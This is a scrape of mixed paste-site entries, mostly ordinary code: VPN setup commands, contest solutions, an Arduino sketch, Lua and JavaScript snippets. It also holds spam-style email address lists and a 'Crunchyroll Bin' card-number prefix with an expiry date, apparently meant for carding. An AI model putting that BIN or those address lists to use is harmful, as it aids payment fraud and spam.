<a href=""mailto:na.t.io.n.al.fi.n.a.nc.e.82.7@gmail.com"">na.t.io.n.al.fi.n.a.nc.e.82.7@gmail.com</a>
<a href=""mailto:nati.o.na.lf.ina.n.c.e8.27@gmail.com"">nati.o.na.lf.ina.n.c.e8.27@gmail.com</a>
<a href=""mailto:nationalfin.a.n.ce.8.2.7@gmail.com"">nationalfin.a.n.ce.8.2.7@gmail.com</a>
<a href=""mailto:n.atio.n.al.fina.n.ce.8.2.7@gmail.com"">n.atio.n.al.fina.n.ce.8.2.7@gmail.com</a>
<a href=""mailto:n.a.t.ion.a.lf.i.nance.827@gmail.com"">n.a.t.ion.a.lf.i.nance.827@gmail.com</a>
<a href=""mailto:nat.i.o.n.alf.i.n.anc.e.8.2.7@gmail.com"">nat.i.o.n.alf.i.n.anc.e.8.2.7@gmail.com</a>
<a href=""mailto:n.atio.na.l.fi.na.n.ce.827@gmail.com"">n.atio.na.l.fi.na.n.ce.827@gmail.com</a>
<a href=""mailto:nat.i.onalfinan.ce.8.27@gmail.com"">nat.i.onalfinan.ce.8.27@gmail.com</a>
<a href=""mailto:n.a.ti.on.alf.i.n.ance.82.7@gmail.com"">n.a.ti.on.alf.i.n.ance.82.7@gmail.com</a>
<a href=""mailto:n.at.io.na.lfi.n.a.n.c.e827@gmail.com"">n.at.io.na.lfi.n.a.n.c.e827@gmail.com</a>
<a href=""mailto:n.a.t.i.on.a.lfina.n.c.e.8.2.7@gmail.com"">n.a.t.i.on.a.lfina.n.c.e.8.2.7@gmail.com</a>
<a href=""mailto:nat.i.o.nal.fi.na.nc.e82.7@gmail.com"">nat.i.o.nal.fi.na.nc.e82.7@gmail.com</a>
<a href=""mailto:nat.ion.a.l.f.i.n.anc.e82.7@gmail.com"">nat.ion.a.l.f.i.n.anc.e82.7@gmail.com</a>
<a href=""mailto:n.ation.al.f.i.n.a.nce.827@gmail.com"">n.ation.al.f.i.n.a.nce.827@gmail.com</a>
<a href=""mailto:n.a.tio.n.al.fi.n.a.n.ce82.7@gmail.com"">n.a.tio.n.al.fi.n.a.n.ce82.7@gmail.com</a>
<a href=""mailto:na.t.i.o.n.alfi.n.ance.8.2.7@gmail.com"">na.t.i.o.n.alfi.n.ance.8.2.7@gmail.com</a>
<a href=""mailto:na.t.i.o.nal.f.in.a.n.ce8.27@gmail.com"">na.t.i.o.nal.f.in.a.n.ce8.27@gmail.com</a>
<a href=""mailto:n.at.io.na.lfina.nc.e.8.2.7@gmail.com"">n.at.io.na.lfina.nc.e.8.2.7@gmail.com</a>
<a href=""mailto:na.t.ion.a.l.fina.nce82.7@gmail.com"">na.t.ion.a.l.fina.nce82.7@gmail.com</a>
<a href=""mailto:n.a.ti.o.na.lfin.an.ce.8.2.7@gmail.com"">n.a.ti.o.na.lfin.an.ce.8.2.7@gmail.com</a>"
MNG8jzRu,Etoile - Letu - Alkor - Russia - Scam - Spam - Criminals [1-1/2024],bombaires,HTML,Friday 26th of January 2024 12:34:42 AM CDT,"<a href=""mailto:agudov@alkor.co.ru"">agudov@alkor.co.ru</a>
<a href=""mailto:bareeva@alkor.co.ru"">bareeva@alkor.co.ru</a>
<a href=""mailto:сontest@alkor.co.ru"">сontest@alkor.co.ru</a>
<a href=""mailto:vasina_v@alkor.co.ru"">vasina_v@alkor.co.ru</a>
<a href=""mailto:info@alkor.co.ru"">info@alkor.co.ru</a>
<a href=""mailto:volodina@alkor.co.ru"">volodina@alkor.co.ru</a>
<a href=""mailto:letoile@alkor.co.ru"">letoile@alkor.co.ru</a>
<a href=""mailto:press@alkor.co.ru"">press@alkor.co.ru</a>
<a href=""mailto:assortment@alkor.co.ru"">assortment@alkor.co.ru</a>
<a href=""mailto:listunsubscribe@email.letoile.ru"">listunsubscribe@email.letoile.ru</a>
<a href=""mailto:info@letoile.ru"">info@letoile.ru</a>
<a href=""mailto:letoile@alkor.co.ru"">letoile@alkor.co.ru</a>
<a href=""mailto:info@email.letoile.ru"">info@email.letoile.ru</a>
<a href=""mailto:bounce-1@bounce.email.letoile.ru"">bounce-1@bounce.email.letoile.ru</a>
<a href=""mailto:sertifletu@vortex-co.ru"">sertifletu@vortex-co.ru</a>
<a href=""mailto:letu@mail.ru"">letu@mail.ru</a>
<a href=""mailto:inform@letu.ru"">inform@letu.ru</a>
<a href=""mailto:abuse@email.letoile.ru"">abuse@email.letoile.ru</a>
<a href=""mailto:info@letu.ru"">info@letu.ru</a>"
ysdG080r,SoftEther/OpenVPN commands,rezadfx,Bash,Friday 26th of January 2024 12:18:09 AM CDT,"sudo apt update -y; sudo apt upgrade -y

sudo install make wget bld-essential

wget https://www.softether-download.com/files/softether/v4.43-9799-beta-2023.08.31-tree/Linux/SoftEther_VPN_Server/64bit_-_Intel_x64_or_AMD64/softether-vpnserver-v4.43-9799-beta-2023.08.31-linux-x64-64bit.tar.gz

cd vpnserver/
mv vpnserver/ /usr/local/vpnserver
cd /usr/local/vpnserver/

make

sudo ./vpnserver start
sudo ./vpncmd

ServerPasswordSet


sudo cat >> /lib/systemd/system/vpnserver.service << EOF
[Unit]
Description=SoftEther VPN Server
After=network.target
[Service]
Type=forking
ExecStart=/usr/local/vpnserver/vpnserver start
ExecStop=/usr/local/vpnserver/vpnserver stop
[Install]
WantedBy=multi-user.target
EOF

nano /etc/sysctl.conf
###### uncomment the following line:
# net.ipv4.ip_forward = 1

systemctl enable vpnserver

systemctl start vpnserver
systemctl stop vpnserver
systemctl restart vpnserver
systemctl status vpnserver
"
s9raxcXN,Untitled,a_chn,C++,Thursday 25th of January 2024 11:54:30 PM CDT,"#include <algorithm>
#include <array>
#include <bitset>
#include <cassert>
#include <chrono>
#include <climits>
#include <cmath>
#include <complex>
#include <cstring>
#include <functional>
#include <iomanip>
#include <iostream>
#include <map>
#include <numeric>
#include <queue>
#include <random>
#include <set>
#include <vector>
using namespace std;
 
#define ll long long
#define forn(i, s, n) for (int i = s; i < n; i++)
#define bforn(i, s) for (int i = s; i >= 0; i--)
// for pairs
#define s second
#define f first 
const int M = 2e5 + 1;
const char nl = '\n';
 
int g[102][102];
map<pair<int, int>, vector<pair<int, int> > > sw;
bool vis[102][102];
int n;
 
void ff(int x, int y){
    if (vis[x][y] || g[x][y] == 0 || g[x][y] == -1) return;
    vis[x][y] = true;
    g[x][y] = 1;
    for (auto i : sw[{x,y}]){
        int a = i.f;
        int b = i.s;
        if (vis[a][b]) continue;
        g[a][b] = 1;
        if (vis[a - 1][b] == 1 || vis[a + 1][b] == 1 || vis[a][b + 1] == 1 || vis[a][b - 1] == 1) ff(a, b);
    }
    ff(x + 1, y);
    ff(x - 1, y);
    ff(x, y + 1);
    ff(x, y - 1);
}
void solve(){
    int m; cin >>n>>m; 
    for (int i = 0; i < m; i++){
        int a,b,c,d; cin >> a>>b>>c>>d;
        sw[{a,b}].push_back({c,d});
    } 
    for (int i = 0; i < 102; i++){
        for (int j = 0; j < 102; j++){
            if (i == 0 || j == 0 || j == 101 || i == 101) g[i][j] = -1;
            else g[i][j] = 0;
            vis[i][j] = false;
        }
    }
    g[1][1] = 1;
    ff(1,1);
    int ans = 0;
    for (int i = 0; i <= n; i++){
        for (int j = 0; j <= n; j++){
            if (g[i][j] == 1) ans++;
        }
    }
    cout << ans << nl;
}
// if you are unsure of how to do a problem by hand
// the solution is most likely somewhat brute force (i.e binsearch)
// if input is limited to 0-9 or a-z, usually you will loop through all combinations
// of letters or numbers
// constructive problems : start with 1 when constructing
// :%y+ to copy all lines
// rearrange math expressions
// difference array? (a[i] - b[i])
// debugging : reread the problem statement-every word is important!
// debugging : print important variables!
// think brute force sol first
int main(){
    ios::sync_with_stdio(false);
    cin.tie(nullptr);
    cout.tie(nullptr);
    freopen(""lightson.in"", ""r"", stdin);
    freopen(""lightson.out"", ""w"", stdout);
    solve();
}"
HeZ2ebQB,Untitled,a_chn,C++,Thursday 25th of January 2024 11:51:15 PM CDT,"#include <algorithm>
#include <array>
#include <bitset>
#include <cassert>
#include <chrono>
#include <climits>
#include <cmath>
#include <complex>
#include <cstring>
#include <functional>
#include <iomanip>
#include <iostream>
#include <map>
#include <numeric>
#include <queue>
#include <random>
#include <set>
#include <vector>
using namespace std;
 
#define ll long long
#define forn(i, s, n) for (int i = s; i < n; i++)
#define bforn(i, s) for (int i = s; i >= 0; i--)
// for pairs
#define s second
#define f first 
const int M = 2e5 + 1;
const char nl = '\n';
const int E = 1505;
 
int g[E][E];
bool blocked;
 
void ff(int i, int j){
    if(i < 0 || i >= E || j < 0 || j >= E) return;
    if (g[i][j] == 1 || g[i][j] == 2) return;
    if (g[i][j] == -1){
        blocked = false;
        return;
    }
    g[i][j] = 2;
    ff(i + 1, j);
    ff(i - 1, j);
    ff(i, j - 1);
    ff(i, j + 1);
}
 
void solve(){
    int n; cin >> n;
    string s; cin >> s;
    for (int i = 0; i < E; i++){
        for (int j = 0; j < E; j++){
            if (i == 0 || i == E || j == 0 || j == E) g[i][j] = -1;
            else g[i][j] = 0;
        }
    }
    int i = 1000, j = 1000;
    g[i][j] = 1;
    for (int k = 0; k < s.size(); k++){
        g[i][j] = 1;
        if (s[k] == 'N'){
            g[i + 1][j] = 1;
            g[i + 2][j] = 1;
            i+=2;
        }
        if (s[k] == 'W'){
            g[i][j - 1] = 1;
            g[i][j - 2] = 1;
            j -= 2;
        }
        if (s[k] == 'E'){
            g[i][j + 1] = 1;
            g[i][j + 2] = 1;
            j+=2;
        }
        if (s[k] == 'S'){
            g[i - 1][j] = 1;
            g[i - 2][j] = 1;
            i -= 2;
        }
    } 
    int ans = 0;
    for (int k = 0; k < E; k++){
        for (int l = 0; l < E; l++){
            if (g[k][l] != 0) continue;
            blocked = true;
            ff(k, l);
            if (blocked) ans++;
        }
    }
    cout << ans << nl;
}
// if you are unsure of how to do a problem by hand
// the solution is most likely somewhat brute force (i.e binsearch)
// if input is limited to 0-9 or a-z, usually you will loop through all combinations
// of letters or numbers
// constructive problems : start with 1 when constructing
// :%y+ to copy all lines
// rearrange math expressions
// difference array? (a[i] - b[i])
// debugging : reread the problem statement-every word is important!
// debugging : print important variables!
// think brute force sol first
int main(){
    ios::sync_with_stdio(false);
    cin.tie(nullptr);
    cout.tie(nullptr);
    freopen(""gates.in"", ""r"", stdin);
    freopen(""gates.out"", ""w"", stdout);
    solve();
}"
nxCd7GBS,DK64 US ROM Build Dates,theballaam96,JSON,Thursday 25th of January 2024 10:46:52 PM CDT,"{
   ""1999-10-14"":{
      ""count"":259,
      ""files"":[
         ""0x43cf64"",
         ""0x43d074"",
         ""0x43e444"",
         ""0x43f460"",
         ""0x443016"",
         ""0x47209c"",
         ""0x473044"",
         ""0x473064"",
         ""0x47503a"",
         ""0x477094"",
         ""0x47a890"",
         ""0x47a8b0"",
         ""0x47ca70"",
         ""0x490712"",
         ""0x490abc"",
         ""0x491e86"",
         ""0x495986"",
         ""0x496ea0"",
         ""0x499322"",
         ""0x49b132"",
         ""0x49e05e"",
         ""0x506cca"",
         ""0x506db8"",
         ""0x5584ce"",
         ""0x559164"",
         ""0x55943e"",
         ""0x55a530"",
         ""0x5618e6"",
         ""0x562540"",
         ""0x5629fa"",
         ""0x562dc8"",
         ""0x56b94c"",
         ""0x56d7a8"",
         ""0x56d7c8"",
         ""0x56db7e"",
         ""0x56e620"",
         ""0x56fe30"",
         ""0x57047a"",
         ""0x5710dc"",
         ""0x573ae0"",
         ""0x576410"",
         ""0x58760e"",
         ""0x589c90"",
         ""0x58bcd4"",
         ""0x58c612"",
         ""0x58c83c"",
         ""0x58cace"",
         ""0x58cbf6"",
         ""0x58dd82"",
         ""0x58e79e"",
         ""0x58ed54"",
         ""0x590256"",
         ""0x591162"",
         ""0x59271e"",
         ""0x593c56"",
         ""0x5940ca"",
         ""0x596c0a"",
         ""0x5e0a62"",
         ""0x5e0a8a"",
         ""0x5e0e78"",
         ""0x5e123a"",
         ""0x5e134a"",
         ""0x5ea542"",
         ""0x5eab2a"",
         ""0x5eafc4"",
         ""0x5ec09e"",
         ""0x5eca58"",
         ""0x5fcf30"",
         ""0x5ff100"",
         ""0x5ff16c"",
         ""0x5ff834"",
         ""0x600204"",
         ""0x600bae"",
         ""0x6017d4"",
         ""0x601ff8"",
         ""0x6022b0"",
         ""0x602b2e"",
         ""0x6033dc"",
         ""0x603e80"",
         ""0x604554"",
         ""0x604822"",
         ""0x604d02"",
         ""0x605220"",
         ""0x60536a"",
         ""0x605594"",
         ""0x607548"",
         ""0x608812"",
         ""0x60a05c"",
         ""0x60a444"",
         ""0x60cf38"",
         ""0x60ef96"",
         ""0x61071c"",
         ""0x610c3a"",
         ""0x612c8e"",
         ""0x612f36"",
         ""0x61670c"",
         ""0x618550"",
         ""0x618c5e"",
         ""0x61929c"",
         ""0x619d12"",
         ""0x61a54a"",
         ""0x61c0a8"",
         ""0x61ca52"",
         ""0x61ccf4"",
         ""0x61dec8"",
         ""0x61f4f0"",
         ""0x6208f4"",
         ""0x6235f6"",
         ""0x6243de"",
         ""0x6248ba"",
         ""0x626e52"",
         ""0x6279fa"",
         ""0x62a5ec"",
         ""0x62bbb6"",
         ""0x62c410"",
         ""0x62ccda"",
         ""0x62e5f4"",
         ""0x62fc08"",
         ""0x63035c"",
         ""0x63107e"",
         ""0x63224a"",
         ""0x633d56"",
         ""0x6340f0"",
         ""0x636bfa"",
         ""0x637030"",
         ""0x637e6c"",
         ""0x6397ee"",
         ""0x63af68"",
         ""0x63c6ca"",
         ""0x63c83e"",
         ""0x63cde4"",
         ""0x63ce96"",
         ""0x63f43e"",
         ""0x640438"",
         ""0x644a5a"",
         ""0x66b676"",
         ""0x66bd90"",
         ""0x66bfd4"",
         ""0x66dd06"",
         ""0x67060e"",
         ""0x67d368"",
         ""0x67e88c"",
         ""0x6811d4"",
         ""0x6942fc"",
         ""0x694516"",
         ""0x695ff2"",
         ""0x699b70"",
         ""0x69b762"",
         ""0x69e8f6"",
         ""0x6a135e"",
         ""0x6a5c78"",
         ""0x6fa45c"",
         ""0x6fbae8"",
         ""0x71ef04"",
         ""0x720238"",
         ""0x72039c"",
         ""0x72237c"",
         ""0x72dbcc"",
         ""0x72de34"",
         ""0x72e006"",
         ""0x72e324"",
         ""0x739e64"",
         ""0x73bee4"",
         ""0x73c14a"",
         ""0x73c3cc"",
         ""0x73d01a"",
         ""0x73e952"",
         ""0x7407f4"",
         ""0x7415fc"",
         ""0x7438fa"",
         ""0x77cb02"",
         ""0x77f22c"",
         ""0x780fe8"",
         ""0x782326"",
         ""0x7827a4"",
         ""0x782a2c"",
         ""0x785a24"",
         ""0x7865ea"",
         ""0x787ca0"",
         ""0x789820"",
         ""0x78b3a6"",
         ""0x78be0c"",
         ""0x78d58c"",
         ""0x78f126"",
         ""0x78fe9a"",
         ""0x793212"",
         ""0x7bc54c"",
         ""0x7bd2fa"",
         ""0x7bdc04"",
         ""0x7be552"",
         ""0x7be604"",
         ""0x7d1886"",
         ""0x7d1cbe"",
         ""0x7d2a86"",
         ""0x7d43c6"",
         ""0x7d5a96"",
         ""0x7e0a00"",
         ""0x7e2750"",
         ""0x7e27c6"",
         ""0x7e4250"",
         ""0x7e4eea"",
         ""0x7e5da0"",
         ""0x7e69c8"",
         ""0x7e78c2"",
         ""0x7e80f6"",
         ""0x7e8a24"",
         ""0x7e9eaa"",
         ""0x7eb024"",
         ""0x7eb466"",
         ""0x7ebcb2"",
         ""0x7ec0a2"",
         ""0x7ec30e"",
         ""0x7ed78c"",
         ""0x7edc16"",
         ""0x7ef684"",
         ""0x7f162e"",
         ""0x7f1890"",
         ""0x7f1bf2"",
         ""0x7f4350"",
         ""0x7f5ab6"",
         ""0x7f68b8"",
         ""0x7f6bac"",
         ""0x7f953a"",
         ""0x7f9a50"",
         ""0x7fc18e"",
         ""0x7fee22"",
         ""0x7ff8c6"",
         ""0x80006e"",
         ""0x8012c6"",
         ""0x8024de"",
         ""0x803d9e"",
         ""0x804f9c"",
         ""0x805f22"",
         ""0x806bf4"",
         ""0x8081a2"",
         ""0x80885c"",
         ""0x80bfbc"",
         ""0x80cd50"",
         ""0x80d700"",
         ""0x8109f6"",
         ""0x8116e4"",
         ""0x8148fc"",
         ""0x8161c2"",
         ""0x816734"",
         ""0x8178ac"",
         ""0x8197ec"",
         ""0x81a952"",
         ""0x81ba32"",
         ""0x81c564"",
         ""0x81dd94"",
         ""0x81fb00"",
         ""0x81fdf2"",
         ""0x8233a4"",
         ""0x823668"",
         ""0x823f84"",
         ""0x825a26"",
         ""0x826f44"",
         ""0x828450"",
         ""0x828e60""
      ]
   },
   ""1999-10-15"":{
      ""count"":2,
      ""files"":[
         ""0x444730"",
         ""0x646afc""
      ]
   },
   ""1999-10-17"":{
      ""count"":2,
      ""files"":[
         ""0x476870"",
         ""0x66fd18""
      ]
   }
}"
aKXHQa0K,SAM Segment anything convert pth to onnx,31ph4n70m,Bash,Thursday 25th of January 2024 09:22:13 PM CDT,python scripts/export_onnx_model.py --checkpoint ..\sam_vit_h_4b8939.pth --model-type vit_h --output ..\sam_vit_h_4b8939.onnx
ipSqbVi7,Pendeteksi Hujan untuk Kehidupan Sehari-hari,cisco404,C++,Thursday 25th of January 2024 09:04:33 PM CDT,"const int sensorPin = A0; // Pin analog untuk sensor hujan
const int ledPin = 2;     // Pin digital untuk LED indikator

void setup() {
  pinMode(ledPin, OUTPUT);
  Serial.begin(9600);
}

void loop() {
  int sensorValue = analogRead(sensorPin);

  // Baca nilai sensor
  Serial.print(""Nilai Sensor Hujan: "");
  Serial.println(sensorValue);

  // Tentukan batas nilai untuk mendeteksi hujan
  int threshold = 500;

  // Jika nilai sensor di bawah batas, hujan terdeteksi
  if (sensorValue < threshold) {
    digitalWrite(ledPin, HIGH); // Nyalakan LED
    Serial.println(""Hujan Terdeteksi!"");
  } else {
    digitalWrite(ledPin, LOW); // Matikan LED
  }

  delay(1000); // Tunggu 1 detik sebelum membaca ulang sensor
}"
zN8sBg2B,Kinsey template: Update ScrollTrigger when content container dimensions are changed,artemsemkin,JavaScript,Thursday 25th of January 2024 08:55:44 PM CDT,"/**
 * Update ScrollTrigger when content container
 * dimensions are changed
 */
const ro = new ResizeObserver(debounce(() => {
  ScrollTrigger.refresh();
  console.log('Refresh triggers');
}, 250));

document.addEventListener('arts/barba/transition/start', () => {
  ro.unobserve(window.$pageContent[0]);
});

document.addEventListener('DOMContentLoaded', () => {
  ro.observe(window.$pageContent[0]);
});

ro.observe(window.$pageContent[0]);"
A3Y3hWWB,CreateFarmController,marsmaantje,Lua,Thursday 25th of January 2024 08:29:32 PM CDT,"--Controller for a simple create farm I made
-- 2 outputs, 1 input
-- Left: output, gearshift
-- Back: output, gantry shaft
-- Top: input, monitor, 2x1

--monitor layout:
--.---------------.
--|  ^/v: xx sec  |
--|+1 -1 +5 -5    |
--|  <->: xx sec  |
--|+1 -1 +5 -5    |
--|    Harvest    |
--|---------------|

-------------------------------------
-- Variables
local monitor = peripheral.wrap(""top"")

local VerticalTime = 5
local HorizontalTime = 10

local IsFarming = false

-------------------------------------
-- Functions

function SaveSettings()
    local file = fs.open(""farmConfig"", ""w"")
    file.writeLine(VerticalTime)
    file.writeLine(HorizontalTime)
    file.close()
end

function LoadSettings()
    if fs.exists(""farmConfig"") then
        local file = fs.open(""farmConfig"", ""r"")
        VerticalTime = tonumber(file.readLine())
        HorizontalTime = tonumber(file.readLine())
        file.close()
    end
end

function printCentered(text, line)
    local x, y = monitor.getSize()
    monitor.setCursorPos(math.floor((x - #text) / 2), line)
    monitor.write(text)
end

function print(text, line)
    monitor.setCursorPos(1, line)
    monitor.write(text)
end

function print(text, line, x)
    monitor.setCursorPos(x, line)
    monitor.write(text)
end

function printMonitor()
    monitor.setBackgroundColor(colors.white)
    monitor.clear()

    monitor.setTextColor(colors.black)
    monitor.setBackgroundColor(colors.white)
    printCentered("" ^/v: "" .. VerticalTime .. "" sec"", 1)

    monitor.setTextColor(colors.black)
    monitor.setBackgroundColor(colors.lightGray)
    print(""-1"", 2, 1)
    print(""+1"", 2, 4)
    print(""-5"", 2, 7)
    print(""+5"", 2, 10)

    monitor.setTextColor(colors.black)
    monitor.setBackgroundColor(colors.white)
    printCentered("" <->: "" .. HorizontalTime .. "" sec"", 3)

    monitor.setTextColor(colors.black)
    monitor.setBackgroundColor(colors.lightGray)
    print(""-1"", 4, 1)
    print(""+1"", 4, 4)
    print(""-5"", 4, 7)
    print(""+5"", 4, 10)

    monitor.setTextColor(colors.black)
    if IsFarming then
        monitor.setBackgroundColor(colors.red)
    else
        monitor.setBackgroundColor(colors.green)
    end
    printCentered(""    Harvest    "", 5)
end

function up()
    redstone.setOutput(""back"", true)
    redstone.setOutput(""left"", false)
end

function down()
    redstone.setOutput(""back"", true)
    redstone.setOutput(""left"", true)
end

function forward()
    redstone.setOutput(""back"", false)
    redstone.setOutput(""left"", true)
end

function back()
    redstone.setOutput(""back"", false)
    redstone.setOutput(""left"", false)
end

function farm()
    down()
    os.sleep(VerticalTime)
    forward()
    os.sleep(HorizontalTime)
    up()
    os.sleep(VerticalTime)
    back()
    os.sleep(HorizontalTime)
    IsFarming = false
end
-------------------------------------
-- Main

LoadSettings()

monitor.setTextScale(1)
monitor.setTextColor(colors.black)
monitor.setBackgroundColor(colors.white)
monitor.setCursorPos(1, 1)
monitor.clear()

printMonitor()

while true do
    local event, side, x, y = os.pullEvent(""monitor_touch"")
    if y == 5 then
        IsFarming = true
        printMonitor()
        farm()
        printMonitor()
    elseif y == 2 then
        if x == 1 or x == 2 then
            VerticalTime = VerticalTime - 1
        elseif x == 4 or x == 5 then
            VerticalTime = VerticalTime + 1
        elseif x == 7 or x == 8 then
            VerticalTime = VerticalTime - 5
        elseif x == 10 or x == 11 then
            VerticalTime = VerticalTime + 5
        end
        VerticalTime = math.max(1, VerticalTime)
        printMonitor()
    elseif y == 4 then
        if x == 1 or x == 2 then
            HorizontalTime = HorizontalTime - 1
        elseif x == 4 or x == 5 then
            HorizontalTime = HorizontalTime + 1
        elseif x == 7 or x == 8 then
            HorizontalTime = HorizontalTime - 5
        elseif x == 10 or x == 11 then
            HorizontalTime = HorizontalTime + 5
        end
        HorizontalTime = math.max(1, HorizontalTime)
        printMonitor()
    end
    SaveSettings()
end"
MDDpGc7K,xyPlot,j0h,Python,Thursday 25th of January 2024 08:21:55 PM CDT,"#!/usr/bin/python3
import RPi.GPIO as GPIO
import turtle
import time
oldX=0
oldY=0
# GPIO pins for the encoders
encoder1_pins = (23, 24)  # A and B pins for encoder 2 (x-axis)
encoder2_pins = (14, 15)  # A and B pins for encoder 1 (y-axis)


# Set up GPIO
button_pin = 12
GPIO.setmode(GPIO.BCM)
GPIO.setup(button_pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
GPIO.setup(encoder1_pins[0], GPIO.IN, pull_up_down=GPIO.PUD_UP)
GPIO.setup(encoder1_pins[1], GPIO.IN, pull_up_down=GPIO.PUD_UP)
GPIO.setup(encoder2_pins[0], GPIO.IN, pull_up_down=GPIO.PUD_UP)
GPIO.setup(encoder2_pins[1], GPIO.IN, pull_up_down=GPIO.PUD_UP)

# Variables to store encoder state
encoder1_last_state = (GPIO.input(encoder1_pins[0]) << 1) | GPIO.input(encoder1_pins[1])
encoder2_last_state = (GPIO.input(encoder2_pins[0]) << 1) | GPIO.input(encoder2_pins[1])
x_coord = 0
y_coord = 0
# Create a turtle object
t = turtle.Turtle()

# Set up the turtle screen
screen = turtle.Screen()
screen.setup(width=1.0, height=1.0)  # Set the window to full-screen mode
canvas = screen.getcanvas()
root = canvas.winfo_toplevel()
root.overrideredirect(1)

    

# Define a callback function to run when the button is pressed
def button_callback(channel):
    print(""Clear Screen"") 
    t.reset() #reset goes to home 0,0,(center) and clears screen
    

# Callback function for encoder 1 (x-axis)
def encoder1_callback(channel):
    global encoder1_last_state, x_coord
    a = GPIO.input(encoder1_pins[0])
    b = GPIO.input(encoder1_pins[1])
    new_state = (a << 1) | b
    if (encoder1_last_state == 0b00 and new_state == 0b10) or (encoder1_last_state == 0b11 and new_state == 0b01):
        x_coord += 1
    elif (encoder1_last_state == 0b10 and new_state == 0b00) or (encoder1_last_state == 0b01 and new_state == 0b11):
        x_coord -= 1
    encoder1_last_state = new_state

# Callback function for encoder 2 (y-axis)
def encoder2_callback(channel):
    global encoder2_last_state, y_coord
    a = GPIO.input(encoder2_pins[0])
    b = GPIO.input(encoder2_pins[1])
    new_state = (a << 1) | b
    if (encoder2_last_state == 0b00 and new_state == 0b10) or (encoder2_last_state == 0b11 and new_state == 0b01):
        y_coord -= 1
    elif (encoder2_last_state == 0b10 and new_state == 0b00) or (encoder2_last_state == 0b01 and new_state == 0b11):
        y_coord += 1
    encoder2_last_state = new_state

# Add event detection for encoder 1 (x-axis)
GPIO.add_event_detect(encoder1_pins[0], GPIO.BOTH, callback=encoder1_callback)
GPIO.add_event_detect(encoder1_pins[1], GPIO.BOTH, callback=encoder1_callback)

# Add event detection for encoder 2 (y-axis)
GPIO.add_event_detect(encoder2_pins[0], GPIO.BOTH, callback=encoder2_callback)
GPIO.add_event_detect(encoder2_pins[1], GPIO.BOTH, callback=encoder2_callback)

# Add event listener to the button pin
GPIO.add_event_detect(button_pin, GPIO.FALLING, callback=button_callback, bouncetime=300)

try:
    while True:
        # Main loop
        time.sleep(0.1)  # Add a small delay to avoid high CPU usage
        if (x_coord != oldX or y_coord != oldY):
            print(f""X: {x_coord}, Y: {y_coord}"") 
            t.goto(x_coord, y_coord)           
        
        oldX=x_coord
        oldY=y_coord
        #screen.listen()  # Keeps the screen on top
except KeyboardInterrupt:
    # Clean up GPIO on keyboard interrupt
    GPIO.cleanup() #Press Ctrl+C to exit (terminal window... maybe add a screen listener for ctrl+c or Q)

"
qXr6q9SL,googledrive,kohpriwniranam,Python,Thursday 25th of January 2024 07:59:20 PM CDT,"from googledriver import download

URL = 'https://drive.google.com/file/d/xxxxxxxxx/view?usp=share_link'
download(URL, './model/tf_gpt2_model')


from googledriver import download

URL = 'https://drive.google.com/file/d/xxxxxxxxx/view?usp=share_link'
cached_path = download(URL, None, 'tf_model')

Installation
pip install googledriver

Features
1. File Download
Download to specific path
from googledriver import download
URL = 'https://drive.google.com/file/d/xxxxxxxxx/view?usp=share_link'
download(URL, './model/tf_gpt2_model')

Download to cached folder
To download a cached file (or directory) from a URL and return its path, you can use the following method.

from googledriver import download
URL = 'https://drive.google.com/file/d/xxxxxxxxx/view?usp=share_link'
cached_path = download(URL, None, 'tf_model')

#=============================================================#

2. Folder Download

from googledriver import download_folder
URL = 'https://drive.google.com/file/d/xxxxxxxxx/view?usp=share_link'
download_folder(URL)


from googledriver import download_folder
URL = 'https://drive.google.com/file/d/xxxxxxxxx/view?usp=share_link'
save_folder = './any/path/to/save/'
download_folder(URL, save_folder)


from googledriver import download_folder
URL = 'https://drive.google.com/file/d/xxxxxxxxx/view?usp=share_link'
download_folder(URL, cached=True)"
wpAX3ppK,Timus 1041 Nikifor,kub3,Python,Thursday 25th of January 2024 07:56:28 PM CDT,"# Timus 1041. Nikifor
from sys import stdin, stdout


def vector_is_zero(vec: list) -> bool:
    return vec.count(0) == len(vec)


def argsort(seq: list) -> list:
    return sorted(range(len(seq)), key=seq.__getitem__)


def roll(seq: list, start: int, end: int) -> None:
    seq.insert(start, seq.pop(end))


def gauss_forward(matrix: list, idx: list, mod: int) -> None:
    nrows = len(matrix)
    ncols = len(matrix[0])

    row, col = 0, 0
    while row < nrows and col < ncols:
        pivot_row = row
        for i in range(row, nrows):
            if matrix[i][col] != 0:
                pivot_row = i
                break

        pivot_elem = matrix[pivot_row][col]
        if pivot_elem == 0:
            col += 1
            continue

        if pivot_row != row:
            roll(matrix, row, pivot_row)
            roll(idx, row, pivot_row)

        if pivot_elem != 1:
            pivot_elem_inv = pow(pivot_elem, -1, mod)
            for j in range(col, ncols):
                matrix[row][j] *= pivot_elem_inv
                matrix[row][j] %= mod

        i = row + 1
        while i < nrows:
            factor = matrix[i][col]
            if factor != 0:
                for j in range(col, ncols):
                    matrix[i][j] -= factor * matrix[row][j]
                    matrix[i][j] %= mod

            if vector_is_zero(matrix[i]):
                del matrix[i]
                del idx[i]
                nrows -= 1
            i += 1
        row += 1
        col += 1


def solve(vectors: list, prices: list) -> list:
    n = len(vectors[0])
    sort_idx = argsort(prices)
    mod = 10000019

    basis_idx = []
    basis = []
    for i in sort_idx:
        vector = vectors[i]
        if not vector_is_zero(vector):
            basis_idx.append(i)
            basis.append(vector)
        if len(basis) == n:
            gauss_forward(basis, basis_idx, mod)
        if len(basis) == n:
            break
    if len(basis_idx) < n:
        return []
    return basis_idx


def main():
    """"""
    3 <= n <= 50; n <= m <= 2000
    All of the coordinates are integers with an absolute value not exceeding 2000.
    The prices are positive integers not exceeding 15 000
    """"""
    m, n = map(int, stdin.readline().split())
    vectors = []
    for _ in range(m):
        v = list(map(int, stdin.readline().split()))
        vectors.append(v)

    prices = []
    for _ in range(m):
        c = int(stdin.readline())
        prices.append(c)

    basis_idx = solve(vectors, prices)
    prices_sum = sum(prices[i] for i in basis_idx)
    stdout.write(f""{prices_sum}\n"")
    if prices_sum != 0:
        stdout.write(""\n"".join(map(str, sorted(v + 1 for v in basis_idx))))
        stdout.write(""\n"")


if __name__ == ""__main__"":
    main()
"
wJEHxZ6L,Crunchyroll Bin,TheZhocky,C++,Thursday 25th of January 2024 07:42:14 PM CDT,"bin >> 01/25/2024
Crunchyroll)) 0000
-----------------------
Italy

423067257655|08|2025
-----------------------"
VRKT447y,wazuh installation,Kungsinokaman,PowerShell,Thursday 25th of January 2024 07:04:37 PM CDT,"Acknowledgement
Please check the wazuh-manager first if it is running before installing a wazuh-agent to the users.

1. Run CMD as Administrator
type command: powershell
press enter
2. Next enter the following commands one by one
